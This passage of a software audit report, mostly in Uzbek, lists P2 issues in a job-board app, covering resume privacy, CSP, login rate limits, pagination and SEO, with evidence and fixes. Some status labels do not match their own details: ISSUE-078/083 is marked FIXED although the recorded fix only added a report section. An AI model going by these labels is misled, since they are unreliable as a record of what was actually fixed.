- **Impact:** Nomzodlar ariza yozuvini jimgina yo'qotadi — ISSUE-025 employer uchun tuzatgan ma'lumot yo'qotish admin yo'lida qolgan. Bildirishnomalar o'chirilgan ID'larga ishora qiladi, kompaniya sharhlari arizasiz qoladi.
- **Evidence:** vacancies.routes.ts:279-290 `if (req.user!.role !== 'admin') { count; 409 }` keyin vacancy.delete. schema.prisma:465 Application vacancy onDelete: Cascade; :489 history; :572 Favorite. DECISIONS.md D-015 admin o'chirishga ruxsat beradi.
- **Recommended fix:** Arizasi bor vakansiyani admin uchun soft holatga (archived, closedBy admin, qidiruvdan yashirin) o'tkazing. Qattiq o'chirishni faqat arizasiz yoki aniq confirm bayrog'i + audit event bilan ruxsat bering. Iste'molchilar yo'q bildirishnoma nishonlariga chidamli bo'lsin.
- **Severity izohi:** P2: ISSUE-025 P1 edi, lekin qolgan yo'l faqat admin qo'lida va ataylab (D-015), shuning uchun P2.
- **Manba topilmalar:** data-integrity-9
- **Bajarilgan fix:** data-integrity-9: FIXED — DELETE /api/vacancies/:id now archives and locks (adminArchivedAt) instead of hard-deleting whenever applications exist, for admins as well; owners keep the 409 VACANCY_HAS_APPLICA
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-036

**Ariza holati istalgan o'tishni qabul qiladi, ariza yuborishda boshlang'ich tarix qatori yozilmaydi**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Mavjud tracker:** ISSUE-036
- **Area:** applications/status
- **Fayl:** `apps/api/src/modules/applications/applications.routes.ts:329`
- **Root cause:** statusSchema viewed/invited/rejected/accepted'ni istalgan joriy holatdan qabul qiladi; yagona himoya bir xil holat no-op. Vakansiya arxivlangan yoki rad etilgandan keyin ham holat o'zgaradi. Apply yo'li arizani boshlang'ich 'sent' tarix qatorisiz yaratadi, demo seed esa uni yozadi.
- **Impact:** Nomzod 'Qabul qilindi' dan keyin 'Ko'rildi' yoki 'Rad etildi' dan keyin 'Taklif' bildirishnomalarini oladi. UI vaqt chizig'i tasodifiy o'zgarishdan boshlanadi. 'status == oxirgi history newStatus' tekshiruvini bir xil qo'llab bo'lmaydi.
- **Evidence:** applications.routes.ts:20-23 z.enum; :316-319 vakansiya holati tekshirilmaydi; :329 `if (!changed && !reasonText) return current`; :82-90 create tarixsiz. DECISIONS.md D-019: holat mashinasi joriy qilinmadi.
- **Recommended fix:** Ruxsat etilgan o'tishlarni belgilang (sent→viewed→invited→accepted|rejected, terminal holatlar faqat aniq reopen bilan), aks holda 409. Boshlang'ich tarix qatorini apply bilan bitta tranzaksiyada yozing; integrity tekshiruvlarida eski qatorlarga chidamli bo'ling.
- **Severity izohi:** P2 saqlandi. ISSUE-036 (FIXED) sarlavhasida 'holat mashinasi yo'q' bor, fix faqat no-op qismini qilgan.
- **Manba topilmalar:** data-integrity-10
- **Bajarilgan fix:** data-integrity-10: PARTIAL — Ariza yaratilganda boshlang'ich 'sent' ApplicationStatusHistory yozuvi bitta tranzaksiyada yoziladi. Qat'iy holat mashinasi ATAYIN kiritilmadi — D-064 (lead ko'rsatmasi: faqat bosh
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-045

**Ish beruvchi arizalari ro'yxati server sahifalashsiz: 2000 cheklov eskilarini yashiradi, har qatorda to'liq rezyume (3.5 s / 2.6 MB)**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Mavjud tracker:** ISSUE-045
- **Area:** scale/api
- **Fayl:** `apps/api/src/modules/applications/applications.routes.ts:171`
- **Root cause:** Endpoint 2000 tagacha eng yangi arizani qaytaradi, web esa client'da filtrlaydi. Har qatorda coverLetter, statusHistory, jobSeeker profili va to'liq resume (experience, education, skills); Prisma ularni 2000 ID'li $in so'rovlar bilan yig'adi. [vacancyId, createdAt] indeksi yo'q; count va groupBy shu to'plamni qayta skanlaydi. Per-vakansiya ro'yxati ham 500 qator bilan xuddi shunday.
- **Impact:** 2000 dan ortiq arizali ish beruvchi eskilarini UI'da ko'ra olmaydi va ular bilan ishlay olmaydi. 5000 arizada har ochilish p50 3497 ms, 2609 KB; hajm rezyume kattaligi bilan o'sadi.
- **Evidence:** applications.routes.ts:29 EMPLOYER_LIST_LIMIT=2000; :171-220 include resume{experience,education,skills}, statusHistory, jobSeeker, take 2000; :221 count; :225 groupBy. schema.prisma:472-477 [vacancyId,createdAt] indeksi yo'q. FINAL_AUDIT.md 10K jadvali: keyin cold 4085, p50 3497, 2609 KB.
- **Recommended fix:** page/pageSize<=50 yoki keyset cursor hamda vacancyId, status, period, q parametrlari server'da. Ro'yxat qatori faqat karta maydonlari (ism, headline, vakansiya kartasi, status, createdAt, qisqartirilgan coverLetter, resume title). To'liq rezyume va tarix uchun ownership tekshiruvli GET /api/employer/applications/:id. Holat sonlari bitta groupBy'dan, total shu yig'indidan. @@index([vacancyId, createdAt]) yoki Application.companyId denormalizatsiyasi.
- **Severity izohi:** db-perf P1, scale P2 bergan. P2 tanlandi: ma'lumot yo'qolmaydi, total ko'rinadi (ISSUE-111), 2000+ arizali ish beruvchi 10k miqyosida istisno; asosan performance.
- **Manba topilmalar:** db-perf-1, scale-10k-2
- **Bajarilgan fix:** db-perf-1: FIXED — Server sahifalash (pageSize<=50, standart 20), filtr va saralash; 2000 talik chegara va 'kesilgan ro'yxat' ogohlantirishi olib tashlandi; ro'yxat qatorida rezyume/xat/tarix yo'q; s | scale-10k-2: FIXED — Ro'yxat qatori yengil (rezyume ichki bloklari yo'q), sahifa 50 tagacha, jami groupBy dan; per-vakansiya soni faqat tanlangan ariza tafsilotida hisoblanadi. Tezlikni o'lchash orkest
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-048

**Vakansiya ro'yxati: saralash oxiridagi id indeksda yo'q (blocking sort), har so'rovda count va regex matn qidiruvi**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Mavjud tracker:** ISSUE-048
- **Area:** scale/search
- **Fayl:** `apps/api/src/modules/vacancies/vacancies.service.ts:276`
- **Root cause:** relevance [isPremium, publishedAt, id], date [publishedAt, id], popular [viewsCount, publishedAt, id] tartibida; indekslar [status,isPremium,publishedAt] va [status,publishedAt] — _id yo'q, shuning uchun MongoDB sort'ni indeksdan bera olmaydi (inference, explain SORT bosqichi tekshirilmagan). popular va salary uchun indeks yo'q. Meili yo'q bo'lsa matn title/description/requirements ustida insensitive contains, count() shu filtrni qayta skanlaydi.
- **Impact:** Har ochiq ro'yxat sahifasi va home SSR barcha mos faol vakansiyalarni o'qib top-k sort qiladi; matn qidiruvi p50 306 ms va tavsif uzunligi hamda faol soni bilan o'sadi. page<=1000 bo'lgani uchun skip 50k gacha. ISSUE-053 qo'shgan indeks haqiqiy sort'ga mos emas.
- **Evidence:** vacancies.service.ts:276-289 DATE_ORDER va SORT_ORDERS { id: 'desc' } bilan tugaydi; :249-272 description/requirements contains; :318 pricedCount; :401-412 findMany + count parallel. schema.prisma:440,442 indekslar id'siz. env.ts:79 MEILI_HOST default ''. vacancies.routes.ts:45 page cap 1000.
- **Recommended fix:** Sort'ga mos indekslar: [status,isPremium,publishedAt,id], [status,publishedAt,id], [status,viewsCount,publishedAt,id], [status,isPremium,salaryMin,id]; explain bilan SORT bosqichi yo'qligini tasdiqlang. Prod'da Meilisearch yoqing yoki normalizatsiyalangan searchText + text indeks. Anonim sahifani ~100 bilan cheklang, total'ni 1-sahifadan qayta ishlating.
- **Severity izohi:** P2 saqlandi. ISSUE-048 PARTIAL: regex va count qolgan; ISSUE-053 indeksida id yo'qligi yangi aniqlik.
- **Manba topilmalar:** db-perf-4, scale-10k-10
- **Bajarilgan fix:** db-perf-4: FIXED — Indexes now include the id tiebreaker for every sort the service uses: [status,isPremium,publishedAt,id] (relevance), [status,publishedAt,id] (date), [status,viewsCount,publishedAt | scale-10k-10: PARTIAL — Sort coverage and the duplicated count scan are addressed (see db-perf-4). The regex OR over title/description/requirements is unchanged (replacing it needs Meili in production or 
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-029

**Nomzod rezyume PDF'lari ochiq bearer URL; resumeUrl web ishlatmaydigan endpoint orqali vakansiya egalariga ham yuboriladi**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Mavjud tracker:** ISSUE-029
- **Area:** privacy/uploads
- **Fayl:** `apps/api/src/server.ts:174`
- **Root cause:** fastifyStatic butun UPLOAD_DIR'ni /uploads/ ostida autentifikatsiyasiz beradi, onSend esa faqat nosniff/CSP qo'shadi. @fastify/send sukuti 'Cache-Control: public, max-age=0'; X-Robots-Tag yo'q, robots.txt /uploads'ni yopmaydi. Yagona himoya fayl nomining tasodifiyligi (D-013). ISSUE-029'ning 'authorized stream' qismi bajarilmagan.
- **Impact:** resumeUrl'ni bilgan har kim — nomzod ariza bergan har bir ish beruvchi yoki havolani uzatgan istalgan odam — nomzod faylni almashtirmaguncha yoki o'chirmaguncha PDF'ni tizimga kirmasdan yuklab oladi. Muayyan ish beruvchidan ruxsatni qaytarib olib bo'lmaydi, umumiy keshlar nusxa saqlashi, sizib chiqqan havola indekslanishi mumkin. Rezyumelarda odatda telefon, manzil va tug'ilgan sana bo'ladi, shuning uchun nomzodning shaxsiy ma'lumotlari himoyasi zaiflashadi.
- **Evidence:** server.ts:174 `app.register(fastifyStatic, { root: UPLOAD_DIR, prefix: '/uploads/' })`; :163 onSend faqat nosniff/sandbox. profile.routes.ts:109 `saveUpload(data, RESUME_PREFIX, ['pdf'])` -> /uploads/resume-<hex>.pdf. applications.routes.ts:294 GET /api/vacancies/:id/applications `jobSeekerProfile.resumeUrl`'ni qaytaradi; web faqat /api/employer/applications'ni chaqiradi (lib/employer/applications/api.ts:21), uning select'ida resumeUrl yo'q (:194-209). seo.routes.ts:46-51 robots.txt. DECISIONS.md:139 (D-013).
- **Recommended fix:** Rezyume fayllarini autentifikatsiyalangan route orqali bering, masalan GET /api/applications/:id/resume-file (vakansiya egasi, nomzodning o'zi va admin uchun), 'Cache-Control: private, no-store' va 'X-Robots-Tag: noindex' bilan; resume-* fayllarini fastifyStatic'dan chiqaring. Oraliq qadamlar: ishlatilmayotgan resumeUrl'ni /api/vacancies/:id/applications javobidan olib tashlang, onSend'da /uploads/resume-* uchun no-store va noindex qo'shing, robots.txt'ga 'Disallow: /uploads/' yozing. Web'da faylni Bearer token bilan fetch qilib, blob URL orqali ochish kerak bo'ladi.
- **Severity izohi:** P2 saqlandi (trackerdagi baho). docs-14'dagi rezyume qismi ham shu muammo; docs-14 esa CSP/token muammosiga biriktirildi.
- **Manba topilmalar:** gap3-1
- **Bajarilgan fix:** gap3-1: FIXED — My part: the file is no longer public and robots now disallows /uploads/. The employer-facing select already dropped resumeUrl in favour of hasResumeFile (perf-applications-candida
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-078, ISSUE-083

**Web origin'da CSP yo'q va access token localStorage'da: istalgan XSS tokenni o'g'irlay oladi**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Mavjud tracker:** ISSUE-078, ISSUE-083
- **Area:** security/web-xss
- **Fayl:** `apps/web/src/lib/auth/session.ts:99`
- **Root cause:** D-031 bilan kechiktirilgan: Vercel konfiguratsiyasi, self-hosted server va SSR handler'larning hech biri Content-Security-Policy yubormaydi, access token esa localStorage'da saqlanadi. FINAL_AUDIT ikkalasini ochiq deb qayd etgan, lekin keyingi qadam belgilanmagan.
- **Impact:** Web origin'dagi bitta XSS (masalan maqola CMS yoki uchinchi tomon skripti orqali) CSP to'sig'isiz bajariladi, localStorage'dagi access tokenni o'qiydi va 15 daqiqa davomida foydalanuvchi, jumladan admin nomidan ishlaydi.
- **Evidence:** FINAL_AUDIT.md:142-144 ochiq bo'shliqlar. apps/web'dagi vercel.json, server/index.mjs, vite.config.ts va api/ ichida `content-security-policy` grep hech narsa topmadi (ISSUE-078 NOT FIXED). lib/auth/session.ts:99-100 `window.localStorage.setItem(STORAGE_KEY, token)`, :108 `getItem` (ISSUE-083 NOT FIXED). Rezyume qismi (ISSUE-029) alohida muammo sifatida qayd etilgan.
- **Recommended fix:** Vercel (vercel.json headers) va self-hosted serverga CSP qo'shing: inline tema skripti uchun hash, Google GIS domenlari, connect-src'da API va WS origin'lari. Avval Report-Only rejimida sinab ko'ring. Access token'ni faqat xotirada saqlashga o'ting: httpOnly refresh cookie allaqachon bor, sahifa yuklanganda refresh qilinadi. O'zgarishni har bir muhitda (Vercel, self-hosted, lokal) Google login bilan tekshiring.
- **Severity izohi:** P2 saqlandi: aniq XSS topilmagan, bu qo'shimcha himoya qatlamidagi bo'shliq. docs-14'dagi rezyume qismi takror bo'lgani uchun ISSUE-029 muammosiga o'tkazildi.
- **Manba topilmalar:** docs-14
- **Bajarilgan fix:** docs-14: FIXED — FINAL_AUDIT.md ga Round 3 yakuniy hisoboti qo'shildi
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-011

**Email bo'yicha global login bloki (D-007) I qoidasiga zid; TRUST_PROXY sukuti 'true' bo'lgani uchun IP limitini hali ham soxtalashtirish mumkin**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Mavjud tracker:** ISSUE-011
- **Area:** auth/rate-limit
- **Fayl:** `apps/api/src/common/login-guard.ts:27`
- **Root cause:** Railway proxy hop soni tekshirilmagani uchun D-007 TRUST_PROXY sukutini 'true' qoldirgan va IP'dan qat'i nazar ishlaydigan, email bo'yicha qattiq hisoblagichni tanlagan.
- **Impact:** Istalgan kishi ma'lum email uchun 10 ta so'rov yuborib, parol bilan kirishni 15 daqiqaga yopib qo'yadi va buni takrorlay oladi. Bu I qoidasidagi 'hisobni osonlik bilan bloklatib bo'lmasin' talabiga zid. Tiklash endpoint'i shu naqshni takrorlasa, tiklashni ham bloklatish mumkin bo'ladi. TRUST_PROXY=true bo'lganda soxta X-Forwarded-For daqiqasiga 10 ta IP limitini chetlab o'tadi.
- **Evidence:** login-guard.ts:12-13 `WINDOW_MS = 15 * 60 * 1000`, `MAX_FAILURES = 10`; :27-34 assertLoginAllowed faqat email kaliti bo'yicha 429 qaytaradi. env.ts:113-119 `TRUST_PROXY ... .default('true')`, 'true' -> true. DECISIONS.md:73 (D-007, xavf: lockout DoS). .env.example:52; DEPLOY.md:70; FINAL_AUDIT.md:139. ISSUE-011 PARTIAL.
- **Recommended fix:** Email bo'yicha global blokni (email, IP yoki subnet) juftligi bo'yicha throttle va progressiv kechikish bilan almashtiring. Faqat email bo'yicha umumiy limit juda yuqori chegarada ogohlantirish yoki CAPTCHA bersin. TRUST_PROXY'ni tekshirilgan hop soniga ('1') o'rnating va DEPLOY.md'da majburiy deb yozing. Tiklash, telefon tasdiqlash va parol reset endpointlari uchun limitlarni yangi qarorda hujjatlashtiring.
- **Severity izohi:** P2 saqlandi: blok vaqtinchalik va Google login'ga ta'sir qilmaydi. B oqimi shu naqshni takrorlasa, P1 bo'ladi.
- **Manba topilmalar:** docs-10
- **Bajarilgan fix:** docs-10: FIXED — D-052 login lockout qarori DECISIONS.md da (D-007 o'rnini bosadi)
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-076, ISSUE-077

**DESIGN.md kontrast tekshirilgan deydi, audit esa AA buzilishlarini o'lchagan; prefers-reduced-motion ataylab e'tiborsiz qoldirilgan**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Mavjud tracker:** ISSUE-076, ISSUE-077
- **Area:** a11y/design
- **Fayl:** `apps/web/DESIGN.md:57`
- **Root cause:** Brend talabi (fon doim harakatda) va token tanlovlari dizayn hujjatida belgilangan. D-031 tuzatishlarni kechiktirgan, DESIGN.md esa o'lchangan qiymatlar bilan yangilanmagan.
- **Impact:** WCAG AA kontrast buzilishlari va to'xtatib bo'lmaydigan cheksiz animatsiyalar saqlanib qoladi; dasturchilar bir-biriga zid ko'rsatma oladi.
- **Evidence:** DESIGN.md:57 «Kontrastlar tekshirilgan: dusk 4.9/6.5:1, signal tugmalar 6/4.9:1». FINAL_AUDIT.md:308,315: text-dusk/80 3.59:1, tungi text-signal 3.96:1, tungi bg-signal ustida oq matn 4.47:1 (qayta o'lchanmagan). global.css:419-420 prefers-reduced-motion'da animatsiya ataylab o'chirilmaydi. ISSUE-076, ISSUE-077 NOT FIXED.
- **Recommended fix:** Egadan prefers-reduced-motion yoqilganda fon animatsiyalarini to'xtatish bo'yicha qaror oling. AA'dan o'tmaydigan tokenlarni (text-dusk/80, tungi signal) moslang va DESIGN.md'dagi kontrast qatorini sanasi ko'rsatilgan, o'lchangan qiymatlar bilan almashtiring.
- **Severity izohi:** P2 saqlandi.
- **Manba topilmalar:** docs-12
- **Bajarilgan fix:** docs-12: FIXED — The unverified "Kontrastlar tekshirilgan" line is replaced with measured ratios, and a new "Kontrast, harakat va klaviatura (a11y)" section records that the "background is always m
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-122

**Auth va Telegram oqimlari uchun test strategiyasi yo'q; bot handler'larini unit-test qilib bo'lmaydi**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Mavjud tracker:** ISSUE-122
- **Area:** tests/auth-telegram
- **Fayl:** `apps/api/src/modules/telegram/telegram.service.ts:243`
- **Root cause:** Bot mantig'i global fetch ishlatadigan long-polling modul ichida yopiq: handleLoginStart, handleStart va handleCallbackQuery eksport qilinmagan, e2e esa bot tokenisiz ishlaydi. D-039 testlarni keyinga qoldirgan, ISSUE-122 hali ochiq.
- **Impact:** Kelayotgan tiklash, telefon almashtirish va bog'lash oqimlari (B, D, G, I, J) replay, muddati o'tgan payload, boshqa chat, rate limit va sessiyani bekor qilish bo'yicha regressiya testlarisiz chiqadi. Xavfsizlik fix'i hech kim sezmay buzilishi mumkin.
- **Evidence:** telegram.service.ts:243 `async function handleStart`, :284 `async function handleCallbackQuery` (eksport yo'q); handleLoginStart ham modul ichida yopiq. DECISIONS.md:425-434 D-039 «avtomatik test qo'shilmadi». ISSUES.md:2636 ISSUE-122 NOT FIXED. FINAL_AUDIT.md:354 Telegram/SMTP/push/Google tekshiruvlari NOT RUN. DEPLOY.md:167-179 e2e qamrovida telefon tasdiqlash va bog'lash yo'q.
- **Recommended fix:** Update handler'larini inject qilinadigan sender va soat bilan alohida modulga ajrating. node --test bilan quyidagi holatlarni yozing: payload faqat bir marta ishlaydi; muddati o'tgan va noto'g'ri payload'ga umumiy javob beriladi (crash yo'q); boshqa chatdan kelgan callback rad etiladi; bog'lashda tasdiq so'raladi; reset'dan keyin tokenVersion oshadi va tiklash tokenlari bekor bo'ladi. Test rejasini DEPLOY.md va FINAL_AUDIT'ga qo'shing; Telegram login olib tashlangach, ISSUE-122'ning login qismini obsolete deb belgilang.
- **Severity izohi:** P2 saqlandi.
- **Manba topilmalar:** docs-13
- **Bajarilgan fix:** docs-13: PARTIAL — Auth/Telegram flows now have a real, documented test strategy: apps/api/scripts/auth-telegram-check.mjs boots the API on a separate test DB and drives the bot in-process through th
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-070

**SSR +data API xatosini HTTP 200 ga aylantiradi: detail sahifalar noindex, ro'yxat va bosh sahifa indekslanadigan xato holati (503 yo'q)**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Mavjud tracker:** ISSUE-070
- **Area:** seo/status
- **Fayl:** `apps/web/src/pages/vacancies/@slug/+data.ts:17`
- **Root cause:** Har ApiError (tarmoq xatosi, 8 s timeout, 5xx) null'ga aylanadi va sahifa 200 bilan chiziladi. Detail'da +Head noindex qo'shadi, ro'yxatlarda noindex ham yo'q. D-027 200+noindex'ni ataylab qoldirgan; ISSUE-016 faqat UX'ni tuzatgan.
- **Impact:** API qisqa ishlamay qolgan paytdagi crawl faol vakansiya, kompaniya va maqola sahifalarini indeksdan chiqaradi, qayta indekslash kunlab davom etadi. /vacancies, /salaries va bosh sahifa 'yuklab bo'lmadi' kontenti bilan 200 qaytarib, soft-404 va yupqa snippet xavfiga tushadi.
- **Evidence:** vacancies/@slug/+data.ts:17 `if (error instanceof ApiError) return { vacancy: null, failed: true }`; companies/@slug/+data.ts:17 xuddi shunday; articles/@slug/+data.ts:19; vacancies/+data.ts:16 `.catch((): VacancyPage | null => null)`; vacancies/+Head.tsx:31 noindex'siz; salaries/+data.ts:19; DECISIONS.md D-027.
- **Recommended fix:** Faqat SSR'da (typeof window === 'undefined') asosiy ma'lumot olinmasa throw render(503, ...UNAVAILABLE) qiling va _error noindex'siz retry holatini chizsin. API 404 bersa 404, 5xx yoki timeout bo'lsa 503. Ikkilamchi bloklar (facets, featured) va client navigatsiya o'zgarmasin.
- **Severity izohi:** P2. Detail qismi ISSUE-070 (NOT FIXED), ro'yxat qismi ISSUE-016 fix'idan qolgan status-kod bo'shlig'i; ikkalasi bitta ildiz sababga birlashtirildi.
- **Manba topilmalar:** seo-2, seo-3
- **Bajarilgan fix:** seo-2: FIXED — Vacancy, company and article detail pages: API 404 ⇒ render(404, *_NOT_FOUND) as before; ApiError (5xx, network, 8 s timeout) during SSR ⇒ render(503) with Retry-After: 120 and no- | seo-3: FIXED — During SSR only, a failed primary dataset now throws render(503): /vacancies (page), /companies (first page, except saved=1), /salaries (stats), /articles (page), and the home page
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-071

**Canonical va hreflang barcha query param'larni tashlaydi: sitemap'dagi /salaries?category= canonical'ga zid, ?page= 1-sahifaga qaraydi, ?q= indekslanadi**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Mavjud tracker:** ISSUE-071
- **Area:** seo/canonical
- **Fayl:** `apps/web/src/lib/i18n/head.ts:25`
- **Root cause:** useHead canonical va alternates'ni faqat mantiqiy pathname'dan quradi, sitemap esa query'li maosh URL'larini e'lon qiladi.
- **Impact:** Sitemap'dagi yuzlab kategoriya va hudud maosh URL'lari reytingga chiqmaydi. Chuqur vakansiya sahifalari pagination orqali topilmaydi. Ixtiyoriy ?q= foydalanuvchi matnini <title>ga qo'yib, indekslanadi.
- **Evidence:** head.ts:25 `canonical: ${SITE_ORIGIN}${localizeHref(logical, locale)}`; seo.routes.ts:89-92 `/salaries?category=${c.slug}`, `/salaries?region=${r.slug}`; vacancies/+Head.tsx:31 noindex'siz; articles/index/+Head.tsx q bo'lsa noindex qo'yadi. D-031 bilan kechiktirilgan.
- **Recommended fix:** useHead'ga canonicalParams whitelist qo'shing: salaries uchun category/region (tartiblangan), ro'yxatlar uchun page>1. Alternates'ga ham shu param'larni qo'llang. /vacancies va /companies'da q yoki saved=1 bo'lsa noindex. Bunday qilinmasa, maosh query URL'larini sitemap'dan olib tashlang: sitemap va canonical mos bo'lishi shart.
- **Severity izohi:** P2 saqlandi; ISSUE-071 NOT FIXED, kod o'zgarmagan.
- **Manba topilmalar:** seo-4
- **Bajarilgan fix:** seo-4: FIXED — useHead now receives a validated param whitelist per page: salaries keeps role/category/region (identical to the sitemap URLs), vacancies keeps category + single region + page>1, c
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-072

**Vakansiya muddati hech qachon o'rnatilmaydi: expiresAt yozilmaydi, eskirgan e'lonlar abadiy faol, JobPosting'da validThrough yo'q**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Mavjud tracker:** ISSUE-072
- **Area:** product/vacancy-expiry
- **Fayl:** `apps/api/prisma/schema.prisma:429`
- **Root cause:** Vacancy.expiresAt sxemada bor va API uni select qiladi, lekin create, PUT, PATCH va admin yo'llarining hech biri yozmaydi. Muddati o'tganlarni yopadigan sweep ham yo'q. Yagona yozuvchi demo-seed (publishedAt + 30 kun).
- **Impact:** O'n minglab vakansiya orasida tashlab ketilgan e'lonlar qidiruvda, sitemap-vacancy.xml va facet sonlarida qoladi va hech kim o'qimaydigan arizalarni yig'adi. Prod JobPosting'da validThrough yo'q. Demo va staging'da faol vakansiyalar o'tgan validThrough sanasini e'lon qiladi.
- **Evidence:** schema.prisma:429 `expiresAt DateTime?`; api/src'da vakansiya expiresAt faqat vacancies.service.ts:92 select'da; demo-seed.ts:1714 `expiresAt: published ? new Date(publishedAt.getTime() + 30 * DAY) : null`; seo.routes.ts:99-104 barcha active; web vacancies/@slug/+Head.tsx:59 `...(vacancy.expiresAt ? { validThrough } : {})`.
- **Recommended fix:** Avval mahsulot qarori kerak. (a) Publish va qayta faollashtirishda expiresAt qo'ying (masalan +30/60 kun); alerts taymeridagi kunlik sweep muddati o'tganlarni arxivlasin; muddatdan oldin ish beruvchiga bir bosishda uzaytirish taklif qilinsin; mavjud faollar uchun backfill siyosati. (b) Qaror bo'lmaguncha demo-seed'dagi to'qima expiresAt'ni olib tashlang. Web qatlamida validThrough to'qimang.
- **Severity izohi:** P2. ISSUE-072 PARTIAL: valyuta va sameAs tuzatilgan, validThrough va sweep yo'q. Ikki xom topilma bitta ildiz sababga birlashtirildi.
- **Manba topilmalar:** seo-5, employer-flows-11
- **Bajarilgan fix:** seo-5: FIXED — Web contract item satisfied and verified: JobPosting emits validThrough only when vacancy.expiresAt exists and never synthesizes a date (D-066 keeps auto-expiry out of scope). The  | employer-flows-11: WONT FIX — D-066: expiry policy is an owner decision; createVacancy still never writes expiresAt and no sweep was added.
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-056

**Sitemap'lar keshsiz: har so'rovda 50 mingtagacha qator, kompaniyalarda relation filter ($lookup), 50k dan keyin jimgina kesiladi**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Mavjud tracker:** ISSUE-056
- **Area:** seo/sitemap-performance
- **Fayl:** `apps/api/src/modules/seo/seo.routes.ts:99`
- **Root cause:** Har murojaat to'g'ridan-to'g'ri DB'ga boradi: 50k vakansiya va 50k kompaniya (owner.isBlocked va vacancies.some Mongo'da $lookup), har URL uchun 4 alternate'li XML satr quriladi, jarayon ichida kesh yo'q. API domeni ochiq bo'lgani uchun Vercel s-maxage keshi chetlab o'tiladi; self-hosted'da kesh umuman yo'q.
- **Impact:** Maqsadli hajmda botlar yoki API domeniga murojaat qilgan har kim yagona API instansiyasida og'ir aggregatsiya va xotira sakrashiga sabab bo'ladi. Faol vakansiyalar 50k dan oshsa, qolgan URL'lar jimgina tushib qoladi.
- **Evidence:** seo.routes.ts:99-104 `findMany({ where: { status: "active" }, ... take: 50000 })`; :114-125 `NOT: { owner: { isBlocked: true } }`, `vacancies: { some: { status: "active" } }`; api/seo.js'dagi s-maxage=3600 faqat Vercel'da.
- **Recommended fix:** Har sitemap uchun 30-60 daqiqalik in-memory TTL kesh qo'shing va API javobiga Cache-Control bering. Sitemap'ni 10k talik bo'laklarga (publishedAt/id cursor) bo'lib, index'da sanang. Kompaniyalar uchun avval faol vakansiyalarning companyId'larini olib, id bo'yicha filtrlang yoki hasActiveVacancies bayrog'ini saqlang. Bo'lak nomlari uchun vercel.json va seo.js regex'ini yangilang.
- **Severity izohi:** P2 saqlandi. ISSUE-056 PARTIAL: filtrlar qo'shilgan, kesh va bo'laklash qilinmagan.
- **Manba topilmalar:** seo-9
- **Bajarilgan fix:** seo-9: PARTIAL — In-process 1 h cache + Cache-Control public, max-age=3600 added, employer relation filters replaced by groupBy(companyId) + blocked-owner ids, and the 50k cap now logs a warning wh
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-103

**Canonical, hreflang va sitemap origin'i jimgina localhost'ga tushadi va ikki xil env'dan olinadi (VITE_SITE_URL va WEB_ORIGIN)**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Mavjud tracker:** ISSUE-103
- **Area:** seo/config
- **Fayl:** `apps/web/src/lib/i18n/config.ts:21`
- **Root cause:** SITE_ORIGIN = VITE_SITE_URL || 'http://localhost:3001' va build'da tekshiruv yo'q. API'da WEB_ORIGIN default 'http://localhost:5173', production superRefine uni talab qilmaydi. Sitemap WEB_ORIGIN'dan, canonical VITE_SITE_URL'dan olinadi va mosligi tekshirilmaydi.
